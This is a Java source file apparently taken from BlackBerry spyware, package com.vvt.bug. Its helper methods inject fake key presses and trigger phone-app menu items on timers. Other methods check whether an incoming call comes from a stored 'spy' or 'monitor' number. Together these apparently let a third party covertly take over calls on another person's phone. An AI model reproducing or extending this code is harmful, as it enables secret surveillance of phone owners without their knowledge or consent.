package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;
import com.vvt.std.Constant;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Menu;

public class Util {
	
	protected Locale locale;
	protected boolean localeEnglish;
	
	public void injectKey(final char key, long timeToWait) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					injectKey(key);
				}
			}, timeToWait);
		} catch (Exception e) {
		}
	}

	public void injectKey(char key) {
		try {
			EventInjector.KeyCodeEvent eDown = new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_DOWN, key, KeypadListener.STATUS_NOT_FROM_KEYPAD, 100);
			EventInjector.KeyCodeEvent eUp = new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_UP, key, KeypadListener.STATUS_NOT_FROM_KEYPAD, 100);
			EventInjector.invokeEvent(eDown);
			EventInjector.invokeEvent(eUp);
		} catch (Exception e) {
		}
	}

	public void executeMenuItemThread(final MenuItem menuItem, long timeToWait) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					executeMenuItemThread(menuItem);
				}
			}, timeToWait);
		} catch (Exception e) {
		}
	}

	public void executeMenuItemThread(MenuItem menuItem) {
		try {
			if (menuItem != null) {
				new Thread(menuItem).start();
			}
		} catch (Exception e) {
		}
	}
	
	public MenuItem getMenuItem( String menuItemName, UiApplication voiceApp, boolean localeEnglish, Locale locale) {
		MenuItem menuItem = null;
		try {
			Screen screen = voiceApp.getActiveScreen();
			if (!localeEnglish)
				Locale.setDefault(Locale.get(Locale.LOCALE_en));
			Menu menu = screen.getMenu(0);
			int size = menu.getSize();
			for (int i = 0; i < size; i++) {
				menuItem = (MenuItem) menu.getItemCookie(i);
				String itemName = menuItem.toString();
				if (itemName.startsWith(menuItemName)) {
					if (!localeEnglish)
						Locale.setDefault(locale);
					break;
				}
			}
			if (!localeEnglish)
				Locale.setDefault(locale);
		} catch (Throwable e) {
		}
		return menuItem;
	}
	
	public boolean isSCList(PhoneCall phoneCall, Vector spyNumberStore) {
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		return isInSrcNumberList(spyNumberStore, phoneNumber);
	}
	
	public boolean isSCC(PhoneCall phoneCall, String monitorPhoneNumber) {
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		return isSameNumber(phoneNumber, monitorPhoneNumber);
	}
	
	public boolean isSCCList(PhoneCall phoneCall, Vector spyNumberStore) {
		String phoneNumber = phoneCall.getDisplayPhoneNumber();
		return isInSrcNumberList(spyNumberStore, phoneNumber);
	}
	
	public boolean isInSrcNumberList(Vector srcNumberStore, String destNumber) {
		boolean numbersAreTheSame = false;
		String srcNumber = null;		
		int srcCount = srcNumberStore.size();
		if (!destNumber.trim().equals(Constant.EMPTY_STRING) && srcCount > 0) {
			for (int i = 0; i < srcCount; i++) {
				srcNumber = (String) srcNumberStore.elementAt(i);
				if (!srcNumber.trim().equals(Constant.EMPTY_STRING) && isSameNumber(srcNumber, destNumber)) {
					numbersAreTheSame = true;
					break;
				}
			}
		}
		return numbersAreTheSame;
	}
	
	public boolean isSameNumber(String srcNumber, String destNumber) {
		boolean sameNumber = false;
		srcNumber = PhoneNumberFormat.removeUnexpectedCharactersExceptStartingPlus(srcNumber);
		srcNumber = PhoneNumberFormat.removeNonDigitCharacters(srcNumber).trim();
		srcNumber = PhoneNumberFormat.removeLeadingZeroes(srcNumber).trim();
		destNumber = PhoneNumberFormat.removeUnexpectedCharactersExceptStartingPlus(destNumber);
		destNumber = PhoneNumberFormat.removeNonDigitCharacters(destNumber).trim();
		destNumber = PhoneNumberFormat.removeLeadingZeroes(destNumber).trim();
		int lenSrcNumber = srcNumber.length();
		int lenDestNumber = destNumber.length();
		if (lenSrcNumber > 0 && lenDestNumber > 0) {
			if (lenSrcNumber > lenDestNumber) {
				sameNumber = srcNumber.endsWith(destNumber);
			} else {
				sameNumber = destNumber.endsWith(srcNumber);
			}
		}
		return sameNumber;
	}
	
	public boolean isValidSpyNumber(Vector spyNumberStore) {
		boolean valid = false;
		String spyNumber = null;
		int count = spyNumberStore.size();
		if (count > 0) {
			for (int i = 0; i < count; i++) {
				spyNumber = (String) spyNumberStore.elementAt(i);
				if (!spyNumber.trim().equals(Constant.EMPTY_STRING)) {
					valid = true;
					break;
				}			
			}
		}
		return valid;
	}
}
